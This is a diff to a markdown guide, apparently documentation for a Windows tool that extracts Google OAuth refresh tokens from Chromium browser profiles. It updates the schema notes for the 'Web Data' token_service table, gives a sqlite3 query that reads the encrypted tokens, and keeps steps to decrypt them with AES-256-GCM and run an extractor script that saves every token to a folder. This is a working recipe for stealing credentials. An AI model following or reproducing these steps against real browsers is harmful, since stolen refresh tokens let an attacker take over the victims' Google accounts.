@@ -23,10 +23,18 @@ Profiles include `Default`, `Profile 1`, `Profile 3`, `Guest Profile`, etc. Each
 
 ```sql
 -- Inside Web Data, the target table is: token_service
--- Key columns:
---   service           TEXT    (e.g. "https://accounts.google.com/OAuth2Login/GAIA_SID")
---   encrypted_token   BLOB   (AES-256-GCM encrypted, 12B nonce + ciphertext + 16B tag)
---   account_id        TEXT   (Gaia ID, e.g. "103683277444879361769")
+-- Columns on modern Chromium (Chrome/Edge/Brave 80+):
+--   service             TEXT     (e.g. "https://accounts.google.com/OAuth2Login/GAIA_SID")
+--   encrypted_token     BLOB     (AES-256-GCM encrypted, 12B nonce + ciphertext + 16B tag)
+--   binding_key         BLOB     (optional, token-binding key)
+--   mtls_token_binding  INTEGER  (optional)
+--
+-- Older Chromium builds also shipped:
+--   account_id          TEXT     (Gaia ID, e.g. "103683277444879361769")
+--
+-- `account_id` was removed upstream, so the extractor reads it when it is
+-- present and otherwise parses the Gaia ID off the token itself
+-- (token format: 1//[payload]:[GaiaID]).
 ```
 
 Each row = one Google account's refresh token. Multiple rows per profile = multiple signed-in Google accounts.
@@ -76,7 +84,9 @@ Extract the `os_crypt.encrypted_key` value, base64-decode it, strip the 5-byte `
 
 ```batch
 sqlite3 "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Web Data"
-sqlite> SELECT account_id, length(encrypted_token) FROM token_service WHERE service LIKE '%google%';
+sqlite> SELECT length(encrypted_token) FROM token_service WHERE service LIKE '%google%';
+-- On Chromium builds that still have the account_id column:
+-- sqlite> SELECT account_id, length(encrypted_token) FROM token_service WHERE service LIKE '%google%';
 ```
 
 ### Step 3: Decrypt each token with AES-256-GCM
@@ -101,7 +111,7 @@ token_testing/extract_tokens_windows.py
 
 ```batch
 :: Install requirements first
-pip install pycryptodome pypiwin32
+pip install pycryptodome pywin32
 
 :: Run the extractor (saves all tokens to output_tokens/)
 python extract_tokens_windows.py
